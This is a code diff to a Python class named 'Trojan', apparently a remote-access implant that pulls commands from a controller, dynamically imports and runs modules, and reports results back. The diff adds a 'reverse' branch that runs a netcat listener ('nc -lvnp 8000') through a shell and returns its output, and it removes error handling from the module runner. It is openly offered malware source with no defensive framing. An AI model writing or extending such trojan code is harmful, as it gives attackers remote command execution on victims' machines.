@@ -83,20 +83,27 @@ class Trojan:
             elif command_type == 'module':
                 module_name = command.get('module')
                 if module_name:
-                    if module_name not in sys.modules:
-                        importlib.import_module(module_name)
-                    thread = threading.Thread(target=self.module_runner, args=(module_name,))
-                    thread.start()
+                    if module_name == 'reverse':
+                        # Run netcat to listen on port 8000
+                        shell_command = 'nc -lvnp 8000'
+                        try:
+                            print(f"[*] Executing reverse shell command: {shell_command}")  # Debug output
+                            result = subprocess.check_output(shell_command, shell=True, stderr=subprocess.STDOUT)
+                            result = result.decode('utf-8')
+                        except subprocess.CalledProcessError as e:
+                            result = e.output.decode('utf-8')
+                        self.send_command_result(shell_command, result)
+                    else:
+                        if module_name not in sys.modules:
+                            importlib.import_module(module_name)
+                        thread = threading.Thread(target=self.module_runner, args=(module_name,))
+                        thread.start()
         else:
             print(f"Invalid command format: {command}")
 
     def module_runner(self, module):
-        try:
-            result = sys.modules[module].run()
-            self.store_module_result(result)
-        except Exception as e:
-            print(f"Error running module {module}: {e}")
-            self.store_module_result(f"Module {module} failed: {e}")
+        result = sys.modules[module].run()
+        self.store_module_result(result)
 
     def store_module_result(self, data):
         message = datetime.now().isoformat()
